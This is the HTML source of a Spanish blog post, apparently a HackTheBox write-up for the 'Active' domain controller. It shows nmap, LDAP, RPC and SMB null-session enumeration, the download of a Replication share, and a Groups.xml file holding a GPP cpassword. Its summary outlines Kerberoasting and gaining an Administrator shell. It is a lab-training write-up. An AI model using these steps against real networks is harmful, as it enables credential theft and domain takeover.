@@ -1,0 +1,1418 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+<link rel="icon" href="/assets/images/lanz2.png">
+
+<title>HackTheBox - Active</title>
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HackTheBox - Active | Sh0x blog</title>
+<meta name="generator" content="Jekyll v3.8.6" />
+<meta property="og:title" content="HackTheBox - Active" />
+<meta name="author" content="lanz" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Máquina Windows nivel medio, de cabeza contra un Domain Controller, jugaremos mucho con SMB y sus carpetas compartidas, movimientos SYStematicos y VOLtaicos e.e, bastante crackeo de contraseñas y obtención de tickets para jugar con los perritos (Kerberos)." />
+<meta property="og:description" content="Máquina Windows nivel medio, de cabeza contra un Domain Controller, jugaremos mucho con SMB y sus carpetas compartidas, movimientos SYStematicos y VOLtaicos e.e, bastante crackeo de contraseñas y obtención de tickets para jugar con los perritos (Kerberos)." />
+<link rel="canonical" href="http://localhost:4000/htb/active" />
+<meta property="og:url" content="http://localhost:4000/htb/active" />
+<meta property="og:site_name" content="Sh0x blog" />
+<meta property="og:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/active/148banner.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-05-16T00:00:00-07:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/active/148banner.png" />
+<meta property="twitter:title" content="HackTheBox - Active" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"lanz"},"dateModified":"2021-05-16T00:00:00-07:00","datePublished":"2021-05-16T00:00:00-07:00","description":"Máquina Windows nivel medio, de cabeza contra un Domain Controller, jugaremos mucho con SMB y sus carpetas compartidas, movimientos SYStematicos y VOLtaicos e.e, bastante crackeo de contraseñas y obtención de tickets para jugar con los perritos (Kerberos).","headline":"HackTheBox - Active","image":"https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/active/148banner.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/htb/active"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/images/sh0x.png"},"name":"lanz"},"url":"http://localhost:4000/htb/active"}</script>
+<!-- End Jekyll SEO tag -->
+
+    
+<link href="/assets/css/prism.css" rel="stylesheet">
+
+<link href="/assets/css/theme.css" rel="stylesheet">
+
+<script src="/assets/js/jquery.min.js"></script>
+
+</head>
+
+
+
+
+<body>
+	<!-- defer loading of font and font awesome -->
+	<noscript id="deferred-styles">
+		<link href="https://fonts.googleapis.com/css?family=Sen:400,700&display=swap" rel="stylesheet">
+        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
+	</noscript>
+
+
+<!-- Begin Sidebar Navigation
+================================================== -->
+
+<div class="sidebar">    
+</div>   
+<div class="nav-icon">
+    <div class="hamburger-bar"></div>
+</div>
+<div id="blackover-nav" class="blackover"></div>
+<nav id="menu">
+    <ul>
+        <h3>El tiempo a destiempo</h3>
+        <li><a href="/" style="color: #0ecbe4;">Home</a></li>
+        <li><a href="/categories#article">Artículos</a></li>
+        <li><a href="/categories#htb">HackTheBox</a></li>
+        <li><a href="/about" style="color: rgb(89, 89, 89);">Whoami</a></li>
+    </ul>   
+</nav>
+
+<script src="/assets/js/lunr.js"></script>
+
+<style>
+    
+</style>
+
+<div class="wrap-search">
+    <div class="d-flex align-items-center ml-auto">
+        <i class="fas fa-search show-search"></i>
+        <form class="bd-search ml-3" onSubmit="return lunr_search(document.getElementById('lunrsearch').value);">
+            <input type="text" class="form-control bigradius text-small launch-modal-search" id="lunrsearch" name="q" maxlength="255" value="" placeholder="Escribe y enter :P"/>
+        </form>
+    </div>
+</div>
+
+<div id="lunrsearchresults">
+    <ul></ul>
+</div>
+
+<script src="/assets/js/lunrsearchengine.js"></script>
+
+
+<!-- End Sidebar Navigation
+================================================== -->
+
+<div class="site-content ">
+
+<div class="container">
+
+    <!-- Site Logo/Name
+    ================================================== -->
+   
+    <a class="navbar-brand" href="/">
+        <img src="/assets/images/sh0x.png" alt="Sh0x blog">
+    </a>  
+   
+
+    <!-- Site Tag
+    ================================================== -->
+    
+
+    <!-- Content
+    ================================================== -->
+    <div class="main-content">
+        <div class="entry-header">
+    <!-- Post Title -->
+    <h1 class="posttitle">HackTheBox - Active</h1>
+    <!-- Author & Date  Box -->
+    
+    
+    <div class="d-flex align-items-center mt-4">
+        <div>
+            
+            <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+            
+        </div>            
+        <div>
+        Funk <a targ="_blank" class="text-info">Sh0x</a> el 
+        <span class="post-date"><time class="post-date" datetime="2021-05-16">16 May 2021</time></span>           
+        
+        </div>            
+    </div>
+    
+</div>
+
+<!-- Adsense under title if enabled from _config.yml (change your pub id and slot) -->
+
+
+<!-- Featured Image -->
+
+<div class="entry-featured-image">
+    
+    <img class="featured-image " src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/active/148banner.png" alt="HackTheBox - Active">
+    
+</div>
+
+
+<!-- Content -->
+<!-- Post, Page Content
+================================================== -->
+<div class="article-post">
+    <!-- Toc if any -->
+    
+    <!-- End Toc -->
+    <p>Máquina Windows nivel medio, de cabeza contra un <strong>Domain Controller</strong>, jugaremos mucho con <strong>SMB</strong> y sus carpetas compartidas, movimientos <strong>SYS</strong>tematicos y <strong>VOL</strong>taicos e.e, bastante crackeo de contraseñas y obtención de tickets para jugar con los perritos (<strong>Kerberos</strong>).</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/active/148activeHTB.png" alt="148activeHTB" /></p>
+
+<h3 id="tldr-spanish-writeup">TL;DR (Spanish writeup)</h3>
+
+<p><strong>Creada por</strong>: <a href="https://www.hackthebox.eu/profile/302">eks</a> &amp; <a href="https://www.hackthebox.eu/profile/2984">mrb3n</a>.</p>
+
+<p>LISTOOOOOOOOOOOOOOOOOOOOOO, nos enfrentaremos a un <strong>Domain Controller</strong> con mucho jugueteo.</p>
+
+<p>Inicialmente tendremos una carpeta compartida en la cual tendremos un archivo que se genera gracias al <strong>SYSVOL</strong> llamado <code>Groups.xml</code>, dentro habrá unas credenciales, pero la contraseña estará cifrada, enumerando encontraremos la manera de crackearla, no nos servirán para entablar shells ni nada, pero podremos usarlas contra el servicio <strong>SMB</strong> de nuevo y tener acceso a nuevas carpetas compartidas, una de ellas es <strong>Users</strong>, ahí encontraremos la flag <code>user.txt</code> con respecto al usuario <strong>SVC_TGS</strong>.</p>
+
+<p>Jugando con el servicio <strong>Kerberos</strong> lograremos obtener un <strong>T</strong>icket <strong>G</strong>ranting <strong>S</strong>ervice del usuario que está ejecutando el servicio <strong>SMB</strong> (<strong>Administrator</strong>), debemos crackearlo y apoyándonos de herramientas como <strong>wmiexec</strong> o <strong>psexec</strong> lograremos una terminal como <strong>Administrator</strong> en el <strong>DC</strong> :)</p>
+
+<h4 id="clasificación-de-la-máquina">Clasificación de la máquina</h4>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/active/148statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 90%;" /></p>
+
+<p>Tiene vulnerabilidades más o menos conocidas y tirando a reales.</p>
+
+<blockquote>
+  <p>Escribo para tener mis “notas”, por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) además de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva más de enseñanza que de solo plasmar lo que hice.</p>
+</blockquote>
+
+<p>…</p>
+
+<p>¡Entonces, hagámoslo real!</p>
+
+<ol>
+  <li><a href="#enumeracion">Enumeración</a>.</li>
+  <li><a href="#explotacion">Explotación</a>.</li>
+  <li><a href="#escalada-de-privilegios">Escalada de privilegios</a>.</li>
+</ol>
+
+<p>…</p>
+
+<h2 id="enumeracion">Enumeración <a href="#enumeracion">#</a></h2>
+
+<p>Vamos a empezar con nuestro escaneo de puertos:</p>
+
+<pre><code class="language-bash">ゝ nmap -p- --open -v 10.10.10.100 -oG initScan
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-p-</td>
+      <td style="text-align: left">Escanea todos los 65535</td>
+    </tr>
+    <tr>
+      <td>–open</td>
+      <td style="text-align: left">Solo los puertos que están abiertos</td>
+    </tr>
+    <tr>
+      <td>-v</td>
+      <td style="text-align: left">Permite ver en consola lo que va encontrando</td>
+    </tr>
+    <tr>
+      <td>-oG</td>
+      <td style="text-align: left">Guarda el output en un archivo con formato grepeable para usar una <a href="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png">función</a> de <a href="https://s4vitar.github.io/">S4vitar</a> que me extrae los puertos en la clipboard</td>
+    </tr>
+  </tbody>
+</table>
+
+<pre><code class="language-bash">ゝ cat initScan
+# Nmap 7.80 scan initiated Wed May 12 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10.10.10.100
+# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
+Host: 10.10.10.100 () Status: Up
+Host: 10.10.10.100 () Ports: 53/open/tcp//domain///, 88/open/tcp//kerberos-sec///, 135/open/tcp//msrpc///, 139/open/tcp//netbios-ssn///, 389/open/tcp//ldap///, 445/open/tcp//microsoft-ds///, 464/open/tcp//kpasswd5///, 593/open/tcp//http-rpc-epmap///, 636/open/tcp//ldapssl///, 3268/open/tcp//globalcatLDAP///, 3269/open/tcp//globalcatLDAPssl///, 5722/open/tcp//msdfsr///, 9389/open/tcp//adws///, 47001/open/tcp//winrm///, 49152/open/tcp//unknown///, 49153/open/tcp//unknown///, 49154/open/tcp//unknown///, 49155/open/tcp//unknown///, 49157/open/tcp//unknown///, 49158/open/tcp//unknown///, 49169/open/tcp//unknown///, 49171/open/tcp//unknown///, 49180/open/tcp/////
+# Nmap done at Wed May 12 25:25:25 2021 -- 1 IP address (1 host up) scanned in 103.03 seconds
+</code></pre>
+
+<ul>
+  <li><a href="https://social.technet.microsoft.com/Forums/windows/en-US/1c6a59de-c1fe-4946-bb4e-1fe36fd40b08/required-ports-to-communicate-with-domain-controller?forum=winserverDS#ebc94ca4-80d9-47ba-80a7-8ed88301c06d-isAnswer">Required ports to communicate with Domain controller</a>.</li>
+</ul>
+
+<p>Opa, un montón de puertos, listémoslos:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: center">Puerto</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: center">53</td>
+      <td style="text-align: left"><strong><a href="https://www.cs.ait.ac.th/~on/O/oreilly/tcpip/firewall/ch08_10.htm">DNS</a></strong></td>
+    </tr>
+    <tr>
+      <td style="text-align: center">88</td>
+      <td style="text-align: left"><strong><a href="https://web.mit.edu/kerberos/krb5-1.5/krb5-1.5.4/doc/krb5-user/Introduction.html#Introduction">Kerberos</a></strong></td>
+    </tr>
+    <tr>
+      <td style="text-align: center">135</td>
+      <td style="text-align: left"><strong><a href="https://techlandia.com/puerto-139-info_235022/">RPC</a></strong></td>
+    </tr>
+    <tr>
+      <td style="text-align: center">139</td>
+      <td style="text-align: left"><strong><a href="https://www.varonis.com/blog/smb-port/">SMB</a></strong></td>
+    </tr>
+    <tr>
+      <td style="text-align: center">389</td>
+      <td style="text-align: left"><strong><a href="https://www.profesionalreview.com/2019/01/05/ldap/">LDAP</a></strong></td>
+    </tr>
+    <tr>
+      <td style="text-align: center">445</td>
+      <td style="text-align: left"><strong><a href="https://www.varonis.com/blog/smb-port/">SMB</a></strong></td>
+    </tr>
+    <tr>
+      <td style="text-align: center">464</td>
+      <td style="text-align: left"><strong><a href="https://datatracker.ietf.org/doc/html/rfc3244.html">Kerberos Password Change</a></strong></td>
+    </tr>
+    <tr>
+      <td style="text-align: center">593</td>
+      <td style="text-align: left"><strong><a href="https://book.hacktricks.xyz/pentesting/135-pentesting-msrpc">RPC web</a></strong></td>
+    </tr>
+    <tr>
+      <td style="text-align: center">636</td>
+      <td style="text-align: left"><strong><a href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/enable-ldap-over-ssl-3rd-certification-authority">LDAP SSL</a></strong></td>
+    </tr>
+    <tr>
+      <td style="text-align: center">3268</td>
+      <td style="text-align: left"><strong><a href="https://informatics.perkinelmer.com/Support/KnowledgeBase/details/Default.aspx?TechNote=3142">Global LDAP</a></strong></td>
+    </tr>
+    <tr>
+      <td style="text-align: center">3269</td>
+      <td style="text-align: left"><strong><a href="https://informatics.perkinelmer.com/Support/KnowledgeBase/details/Default.aspx?TechNote=3142">Global LDAP SSL</a></strong></td>
+    </tr>
+    <tr>
+      <td style="text-align: center">5722</td>
+      <td style="text-align: left"><strong><a href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/networking/service-overview-and-network-port-requirements">Distributed File System Replication</a></strong></td>
+    </tr>
+    <tr>
+      <td style="text-align: center">9389</td>
+      <td style="text-align: left"><strong><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-addm/59205cf6-aa8e-4f7e-be57-8b63640bf9a4">Active Directory Web Services (ADWS)</a></strong></td>
+    </tr>
+    <tr>
+      <td style="text-align: center">47001</td>
+      <td style="text-align: left"><strong><a href="https://geeks.ms/eliasmereb/2011/04/14/introduccin-a-winrm-para-windows-server-2008-r2/">WinRM</a></strong></td>
+    </tr>
+    <tr>
+      <td style="text-align: center">49152,49153,49154,49155,49157,49158,49169,49171,49180</td>
+      <td style="text-align: left">Desconocidos</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Ahora hagamos un escaneo de scripts y versiones, así profundizamos en cada puerto:</p>
+
+<p><strong>(Con la función de s4vitar extraemos los puertos fácilmente directo a la clipboard</strong></p>
+
+<pre><code class="language-bash">ゝ extractPorts initScan 
+
+[*] Extracting information...
+
+    [*] IP Address: 10.10.10.100
+    [*] Open ports: 53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001,49152,49153,49154,49155,49157,49158,49169,49171,49180
+
+[*] Ports copied to clipboard
+</code></pre>
+
+<p>)**</p>
+
+<pre><code class="language-bash">ゝ nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001,49152,49153,49154,49155,49157,49158,49169,49171,49180 -sC -sV 10.10.10.100 -oN portScan
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-p</td>
+      <td style="text-align: left">Escaneo de los puertos obtenidos</td>
+    </tr>
+    <tr>
+      <td>-sC</td>
+      <td style="text-align: left">Muestra todos los scripts relacionados con el servicio</td>
+    </tr>
+    <tr>
+      <td>-sV</td>
+      <td style="text-align: left">Nos permite ver la versión del servicio</td>
+    </tr>
+    <tr>
+      <td>-oN</td>
+      <td style="text-align: left">Guarda el output en un archivo</td>
+    </tr>
+  </tbody>
+</table>
+
+<pre><code class="language-bash">ゝ cat portScan
+# Nmap 7.80 scan initiated Wed May 12 25:25:25 2021 as: nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001,49152,49153,49154,49155,49157,49158,49169,49171,49180 -sC -sV -oN portScan 10.10.10.100
+Nmap scan report for 10.10.10.100
+Host is up (0.40s latency).
+
+PORT      STATE  SERVICE       VERSION
+53/tcp    open   domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
+| dns-nsid: 
+|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
+88/tcp    open   kerberos-sec  Microsoft Windows Kerberos (server time: 2021-05-12 17:15:31Z)
+135/tcp   open   msrpc         Microsoft Windows RPC
+139/tcp   open   netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open   ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
+445/tcp   open   microsoft-ds?
+464/tcp   open   tcpwrapped
+593/tcp   open   ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open   tcpwrapped
+3268/tcp  open   ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
+3269/tcp  open   tcpwrapped
+5722/tcp  open   msrpc         Microsoft Windows RPC
+9389/tcp  open   mc-nmf        .NET Message Framing
+47001/tcp open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49152/tcp open   msrpc         Microsoft Windows RPC
+49153/tcp open   msrpc         Microsoft Windows RPC
+49154/tcp open   msrpc         Microsoft Windows RPC
+49155/tcp open   msrpc         Microsoft Windows RPC
+49157/tcp open   ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49158/tcp open   msrpc         Microsoft Windows RPC
+49169/tcp open   msrpc         Microsoft Windows RPC
+49171/tcp open   msrpc         Microsoft Windows RPC
+49180/tcp closed unknown
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: 7m29s
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2021-05-12T17:16:29
+|_  start_date: 2021-05-12T17:01:09
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Wed May 12 25:25:25 2021 -- 1 IP address (1 host up) scanned in 198.07 seconds
+</code></pre>
+
+<p>De las versiones simplemente obtenemos info del servicio <strong>DNS</strong>:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Puerto</th>
+      <th style="text-align: left">Servicio</th>
+      <th style="text-align: left">Versión</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">53</td>
+      <td style="text-align: left">DNS</td>
+      <td style="text-align: left">6.1.7601</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Del escaneo podemos destacar:</p>
+
+<ul>
+  <li>Un dominio: <strong>active.htb</strong>.</li>
+  <li>Probablemente sea un <strong>windows_server_2008</strong>.</li>
+</ul>
+
+<p>Pues a jugar y ver por donde logramos vulnerar lo que parece ser un <a href="http://www.boostsolutions.com/blog/understanding-active-directory/">directorio activo</a> (:</p>
+
+<ul>
+  <li><a href="https://blog.netwrix.com/2017/04/20/tutorial-learn-the-basics-of-active-directory/">Learn basics of active directory</a>.</li>
+</ul>
+
+<blockquote>
+  <p><strong>AD</strong>: Sistema de <strong>Windows</strong> que gestiona el inicio de sesión de los usuarios dentro de la red de una empresa, o “dominio”. Así se determina <strong>a qué recursos puede acceder</strong> esa persona (como archivos, carpetas, impresoras, otros equipos…) en la empresa. <a href="https://www.elgrupoinformatico.com/tutoriales/que-ldap-t74212.html">Info sobre LDAP y AD</a>.</p>
+</blockquote>
+
+<p>…</p>
+
+<h3 id="puerto-135">Puerto 135 - RPC <a href="#puerto-135">⌖</a></h3>
+
+<p>Podemos ver más info del controlador de dominio mediante la herramienta <code>rpcclient</code>, intentemos ingresar con una <strong>null session</strong>, ya que no tenemos credenciales:</p>
+
+<pre><code class="language-bash">ゝ rpcclient 10.10.10.100 -U '' -N
+rpcclient $&gt; enumdomusers
+Could not initialise samr. Error was NT_STATUS_ACCESS_DENIED
+</code></pre>
+
+<p>Podemos ingresar, pero no logramos interactuar con sus funciones, así que F :(</p>
+
+<p>…</p>
+
+<h3 id="puertos-ldap">Puertos 389, 636, 3268, 3269 - LDAP <a href="#puertos-ldap">⌖</a></h3>
+
+<blockquote>
+  <p><strong>Lightweight Directory Access Protocol</strong> (Protocolo Ligero de Acceso a Directorios), es un mecanismo importante en el inicio de sesión de los ordenadores en red, sobre todo dentro de las empresas. <a href="https://www.elgrupoinformatico.com/tutoriales/que-ldap-t74212.html">Info sobre LDAP</a>.</p>
+</blockquote>
+
+<p>Siguiendo <a href="https://book.hacktricks.xyz/pentesting/pentesting-ldap#manual-1">esta guía</a> podemos enumerar el servicio <strong>LDAP</strong> con la herramienta <code>ldapsearch</code>:</p>
+
+<pre><code class="language-bash">ゝ ldapsearch -h 10.10.10.100 -x -s base namingcontexts
+...
+dn:
+namingContexts: DC=active,DC=htb
+namingContexts: CN=Configuration,DC=active,DC=htb
+namingContexts: CN=Schema,CN=Configuration,DC=active,DC=htb
+namingContexts: DC=DomainDnsZones,DC=active,DC=htb
+namingContexts: DC=ForestDnsZones,DC=active,DC=htb
+...
+</code></pre>
+
+<p>Donde <code>-x</code> le indica que haga un null session y <code>-s</code> le pasa el objetivo, en nuestro caso que nos muestre los <a href="https://ldap.com/dit-and-the-ldap-root-dse/">namingContexts</a> definidos por el servidor…</p>
+
+<p>Obtenemos info que ya teníamos (DC=active.htb), pero ahora sabemos como está dividido y su estructura, nos sirve para seguir buscando con <code>ldapsearch</code>, ahora pasémosle el <strong>DC</strong> del cual queremos más info:</p>
+
+<pre><code class="language-bash">ゝ ldapsearch -h 10.10.10.100 -x -b "DC=active,DC=htb"
+...
+result: 1 Operations error
+text: 000004DC: LdapErr: DSID-0C09075A, comment: In order to perform this opera
+ tion a successful bind must be completed on the connection., data 0, v1db1
+...
+</code></pre>
+
+<p>Pero al parecer no podemos hacer nada con el <strong>null session</strong> :( Veamos el servicio <strong>SMB</strong>:</p>
+
+<blockquote>
+  <p><strong>Pa leer:</strong> <a href="https://informatics.perkinelmer.com/Support/KnowledgeBase/details/Default.aspx?TechNote=3142">Diferencias entre los puertos LDAP y LDAP SSL</a>.</p>
+</blockquote>
+
+<p>…</p>
+
+<h3 id="puertos-smb">Puerto 139, 445 - SMB <a href="#puertos-smb">⌖</a></h3>
+
+<blockquote>
+  <p>Agreguemos el dominio <code>active.htb</code> al archivo <a href="https://www.siteground.es/kb/archivo-hosts/">/etc/hosts</a>, por si algo u.u</p>
+</blockquote>
+
+<p><strong>Samba</strong> en pocas palabras nos permite intercambiar archivos en una red.</p>
+
+<blockquote>
+  <p><a href="https://www.ionos.es/digitalguide/servidores/know-how/server-message-block-smb/">Server Message Block (SMB)</a>.</p>
+</blockquote>
+
+<p>Veamos que sistema aparentemente soporta el <strong>DC</strong>:</p>
+
+<pre><code class="language-bash">ゝ crackmapexec smb 10.10.10.100
+SMB         10.10.10.100    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
+</code></pre>
+
+<p>Jmmm, <strong>Windows 6.1</strong>? Pa tener en cuenta, veamos a que recursos tenemos acceso mediante un <strong>null session</strong>, para esto podemos usar <strong>smbmap</strong>:</p>
+
+<pre><code class="language-bash">ゝ smbmap -H 10.10.10.100 -u '' -p ''
+[+] IP: 10.10.10.100:445        Name: active.htb                                        
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        ADMIN$                                                  NO ACCESS       Remote Admin
+        C$                                                      NO ACCESS       Default share
+        IPC$                                                    NO ACCESS       Remote IPC
+        NETLOGON                                                NO ACCESS       Logon server share 
+        Replication                                             READ ONLY
+        SYSVOL                                                  NO ACCESS       Logon server share 
+        Users                                                   NO ACCESS
+</code></pre>
+
+<p>Opa, vemos varios recursos, pero solo tenemos acceso de lectura a uno llamado <strong>Replication</strong>, ahora aprovechemos el uso de <code>smbclient</code> para entrar en ese directorio compartido:</p>
+
+<pre><code class="language-powershell">ゝ smbclient //10.10.10.100/Replication -U '' -N
+Try "help" to get a list of possible commands.
+smb: \&gt; dir
+  .                                   D        0  Sat Jul 21 05:37:44 2018
+  ..                                  D        0  Sat Jul 21 05:37:44 2018
+  active.htb                          D        0  Sat Jul 21 05:37:44 2018
+
+                10459647 blocks of size 4096. 5728737 blocks available
+smb: \&gt; cd active.htb
+smb: \active.htb\&gt; dir
+  .                                   D        0  Sat Jul 21 05:37:44 2018
+  ..                                  D        0  Sat Jul 21 05:37:44 2018
+  DfsrPrivate                       DHS        0  Sat Jul 21 05:37:44 2018
+  Policies                            D        0  Sat Jul 21 05:37:44 2018
+  scripts                             D        0  Wed Jul 18 13:48:57 2018
+
+                10459647 blocks of size 4096. 5728737 blocks available
+smb: \active.htb\&gt; 
+</code></pre>
+
+<p>Bien, al parecer son varios recursos, para evitar ir de carpeta en carpeta, podemos descargar los archivos a nuestra máquina y jugar de la manera que queramos, usaremos <code>smbget</code> para hacer esto:</p>
+
+<p><strong>(También podríamos hacer una montura del directorio, pero no me gusta, a veces va suuuuuuuuuper lento)</strong></p>
+
+<pre><code class="language-bash">ゝ smbget -R  smb://10.10.10.100/Replication -U ''
+Password for [] connecting to //Replication/10.10.10.100: 
+Using workgroup WORKGROUP, guest user
+smb://10.10.10.100/Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI
+smb://10.10.10.100/Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Group Policy/GPE.INI
+smb://10.10.10.100/Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf
+smb://10.10.10.100/Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
+smb://10.10.10.100/Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol
+smb://10.10.10.100/Replication/active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI
+smb://10.10.10.100/Replication/active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf
+Downloaded 8,11kB in 31 seconds
+</code></pre>
+
+<p><strong>(Cuando nos pida la contraseña debemos ponerle un espacio)</strong></p>
+
+<p>Listos, tenemos todo el directorio <strong>Replication</strong>, veámoslo:</p>
+
+<pre><code class="language-bash">ゝ tree
+.
+├── DfsrPrivate
+│   ├── ConflictAndDeleted
+│   ├── Deleted
+│   └── Installing
+├── Policies
+│   ├── {31B2F340-016D-11D2-945F-00C04FB984F9}
+│   │   ├── GPT.INI
+│   │   ├── Group Policy
+│   │   │   └── GPE.INI
+│   │   ├── MACHINE
+│   │   │   ├── Microsoft
+│   │   │   │   └── Windows NT
+│   │   │   │       └── SecEdit
+│   │   │   │           └── GptTmpl.inf
+│   │   │   ├── Preferences
+│   │   │   │   └── Groups
+│   │   │   │       └── Groups.xml
+│   │   │   └── Registry.pol
+│   │   └── USER
+│   └── {6AC1786C-016F-11D2-945F-00C04fB984F9}
+│       ├── GPT.INI
+│       ├── MACHINE
+│       │   └── Microsoft
+│       │       └── Windows NT
+│       │           └── SecEdit
+│       │               └── GptTmpl.inf
+│       └── USER
+└── scripts
+
+21 directories, 7 files
+</code></pre>
+
+<p>…</p>
+
+<h2 id="explotacion">Explotación <a href="#explotacion">#</a></h2>
+
+<p>Entre tantos directorios podemos detectar algunos archivos, pero despues de enumerar cada uno, vemos algo curioso en el objeto <strong>Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml</strong>:</p>
+
+<pre><code class="language-bash">ゝ cat Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
+</code></pre>
+
+<pre><code class="language-xml">&lt;?xml version="1.0" encoding="utf-8"?&gt;
+&lt;Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"&gt;
+    &lt;User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"&gt;
+        &lt;Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/&gt;
+    &lt;/User&gt;
+&lt;/Groups&gt;
+</code></pre>
+
+<p>😱 Algunas cosas para destacar:</p>
+
+<pre><code class="language-xml">* name="active.htb\SVC_TGS", con lo que parece ser un usuario del dominio `active.htb`.
+* cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ". Una contraseña, ¿no? e.e
+</code></pre>
+
+<p>Bien, pues buscando info sobre el campo <code>cpassword</code> en la web, encontramos estos dos posts:</p>
+
+<ul>
+  <li><a href="https://adsecurity.org/?tag=cpassword">Active Directory Security - TAG: Cpassword</a>.</li>
+</ul>
+
+<p>Hacen referencia a <strong>Attack Techniques to go from Domain User to Domain Admin</strong>, y uno de ellos habla del archivo <strong>Groups.xml</strong>, que casi siempre va a contener credenciales de un usuario del dominio…</p>
+
+<p>Siguiendo el post nos indica que ese archivo (y otros) se generan gracias al <strong>SYSVOL</strong>:</p>
+
+<blockquote>
+  <p><strong>SYSVOL</strong> is the domain-wide share in Active Directory to which all authenticated users have read access. SYSVOL contains logon scripts, group policy data, and other domain-wide data which needs to be available anywhere there is a Domain Controller. <a href="https://adsecurity.org/?p=2362">Passwords in SYSVOL</a>.</p>
